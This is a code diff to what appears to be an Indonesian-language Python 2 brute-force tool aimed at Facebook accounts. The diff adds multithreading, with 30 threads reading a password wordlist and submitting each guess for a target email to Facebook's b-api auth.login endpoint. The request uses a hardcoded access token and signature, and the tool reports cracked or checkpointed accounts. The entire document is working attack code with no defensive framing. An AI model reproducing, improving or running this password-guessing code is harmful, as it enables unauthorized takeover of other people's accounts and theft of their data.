@@ -4,6 +4,9 @@ import time
 import json
 import urllib
 import requests
+import threading
+
+threads = []
 
 def login():
     
@@ -28,6 +31,34 @@ def login():
 
         else:
             print " Gagal Login..."
+
+def sup():
+    try:
+        for iqbal in range(30):
+            ival = threading.Thread(target=multi, args=())
+            ival.start()
+            threads.append(ival)
+        
+        for ival in threads:
+            ival.join()
+    except IOError:
+        print " Tidak ada Wordlist"
+
+def multi():
+
+    word1 = open("word.txt", "r")
+    while word1:
+        word = word1.readline().strip()
+        log = ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + word + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+        dev = urllib.urlopen(log)
+        js = json.load(dev)
+        if "access_token" in js:
+            print " Found: " + word
+            sys.exit()
+        elif "www.facebook.com" in js["error_msg"]:
+            print " cekpoint" + word
+        else:
+            print " mencoba ==> " + word 
 
 def brute():
     try:
@@ -69,15 +100,7 @@ def brute():
                 elif "www.facebook.com" in js["error_msg"]:
                     print " Akun Cekpoint" + sandi3
                 else:
-                    word = open("word.txt", "r").readline()
-                    log = ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + word + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                    dev = urllib.urlopen(log)
-                    js = json.load(dev)
-                    if "access_token" in js:
-                        print " Found: " + word
-                    elif "www.facebook.com" in js["error_msg"]:
-                        print " cekpoint" + word
-                    else:
-                        print " Zonkkkkk...."
-                        
+                    sup()
+                   
 login()
+brute()
